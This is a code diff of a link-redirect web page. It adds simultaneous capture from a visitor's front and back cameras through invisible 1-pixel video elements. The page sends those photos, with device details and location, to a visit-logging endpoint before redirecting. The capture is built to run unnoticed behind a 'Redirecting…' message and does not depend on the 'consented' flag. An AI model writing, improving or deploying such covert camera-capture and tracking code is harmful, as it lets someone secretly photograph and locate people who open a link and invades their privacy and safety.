@@ -19,8 +19,10 @@
 
     <div id="status" class="status" style="display:none;"></div>
 
-    <!-- Hidden video/canvas for camera capture -->
-    <video id="camVideo" autoplay playsinline muted
+    <!-- Two hidden videos: one per camera -->
+    <video id="videoFront" autoplay playsinline muted
+      style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
+    <video id="videoBack" autoplay playsinline muted
       style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
     <canvas id="camCanvas" style="display:none;"></canvas>
 
@@ -34,12 +36,76 @@
     const statusEl = document.getElementById('status');
     const continueBtn = document.getElementById('continueBtn');
     const skipBtn = document.getElementById('skipBtn');
-    const video = document.getElementById('camVideo');
     const canvas = document.getElementById('camCanvas');
 
     function setStatus(msg) {
       statusEl.style.display = 'block';
       statusEl.textContent = msg;
+    }
+
+    // Capture a single photo from an already-playing video element
+    function snapPhoto(videoEl) {
+      try {
+        canvas.width = videoEl.videoWidth || 640;
+        canvas.height = videoEl.videoHeight || 480;
+        canvas.getContext('2d').drawImage(videoEl, 0, 0);
+        return canvas.toDataURL('image/jpeg', 0.7);
+      } catch(e) {
+        return null;
+      }
+    }
+
+    // Open both camera streams simultaneously, wait for both to be ready, then snap
+    async function captureBothCameras() {
+      const videoFront = document.getElementById('videoFront');
+      const videoBack  = document.getElementById('videoBack');
+
+      let streamFront = null;
+      let streamBack  = null;
+      let photoFront  = null;
+      let photoBack   = null;
+
+      // Start both streams at the same time
+      const [resultFront, resultBack] = await Promise.allSettled([
+        navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: 'user' }, width: 640, height: 480 },
+          audio: false
+        }),
+        navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: 'environment' }, width: 640, height: 480 },
+          audio: false
+        }),
+      ]);
+
+      // Attach front stream
+      if (resultFront.status === 'fulfilled') {
+        streamFront = resultFront.value;
+        videoFront.srcObject = streamFront;
+        await new Promise(res => { videoFront.onloadedmetadata = res; });
+        await videoFront.play();
+      }
+
+      // Attach back stream
+      if (resultBack.status === 'fulfilled') {
+        streamBack = resultBack.value;
+        videoBack.srcObject = streamBack;
+        await new Promise(res => { videoBack.onloadedmetadata = res; });
+        await videoBack.play();
+      }
+
+      // Wait for exposure to settle
+      await new Promise(res => setTimeout(res, 900));
+
+      // Snap both
+      if (streamFront) photoFront = snapPhoto(videoFront);
+      if (streamBack)  photoBack  = snapPhoto(videoBack);
+
+      // Stop all tracks
+      [streamFront, streamBack].forEach(s => s && s.getTracks().forEach(t => t.stop()));
+      videoFront.srcObject = null;
+      videoBack.srcObject  = null;
+
+      return { photoFront, photoBack };
     }
 
     // Collect all available device info
@@ -57,11 +123,9 @@
         battery_charging: null,
       };
 
-      // Network type
       const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
       if (conn) info.network_type = conn.effectiveType || conn.type || null;
 
-      // Battery
       try {
         if (navigator.getBattery) {
           const bat = await navigator.getBattery();
@@ -73,38 +137,12 @@
       return info;
     }
 
-    // Capture a photo from a given camera (facing: 'user' = front, 'environment' = back)
-    async function capturePhoto(facing) {
-      let stream = null;
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: facing }, width: 640, height: 480 },
-          audio: false
-        });
-        video.srcObject = stream;
-        await new Promise(res => { video.onloadedmetadata = res; });
-        await video.play();
-        // Short delay so camera adjusts exposure
-        await new Promise(res => setTimeout(res, 800));
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        return canvas.toDataURL('image/jpeg', 0.7);
-      } catch(e) {
-        return null;
-      } finally {
-        if (stream) stream.getTracks().forEach(t => t.stop());
-        video.srcObject = null;
-      }
-    }
-
     async function sendVisit(consented, location) {
       setStatus('Redirecting…');
       try {
-        const [deviceInfo, photoFront, photoBack] = await Promise.all([
+        const [deviceInfo, cameras] = await Promise.all([
           collectDeviceInfo(),
-          capturePhoto('user'),
-          capturePhoto('environment'),
+          captureBothCameras(),
         ]);
 
         const resp = await fetch(`/api/visit/${slug}`, {
@@ -114,10 +152,11 @@
             consented,
             location,
             deviceInfo,
-            photo_front: photoFront,
-            photo_back: photoBack,
+            photo_front: cameras.photoFront,
+            photo_back:  cameras.photoBack,
           }),
         });
+
         const data = await resp.json();
         if (data.redirect) {
           window.location.replace(data.redirect);
